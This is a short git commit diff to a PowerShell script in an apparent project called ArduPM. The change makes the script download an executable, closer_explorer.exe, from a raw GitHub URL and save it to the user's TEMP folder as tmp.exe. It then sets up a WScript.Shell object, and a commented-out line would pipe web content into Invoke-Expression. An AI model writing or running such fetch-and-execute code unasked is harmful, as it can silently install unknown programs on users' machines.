429510a1a1f5236741feb07289e0a63753f210e1
MiHaniKo <139514821+NotiLo-A@users.noreply.github.com>
2025-03-13 10:45:27 +0300

    Update main.ps1

--- scripts/main.ps1
+++ scripts/main.ps1
@@ -1,7 +1,7 @@
 #Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/hello.exe")
 
-$url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/hello.exe"
-$output = "$env:TEMP\hello.exe"
+$url = "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/bin/closer_explorer.exe"
+$output = "$env:TEMP\tmp.exe"
 Invoke-WebRequest -Uri $url -OutFile $output
 
 $wshell = New-Object -ComObject WScript.Shell
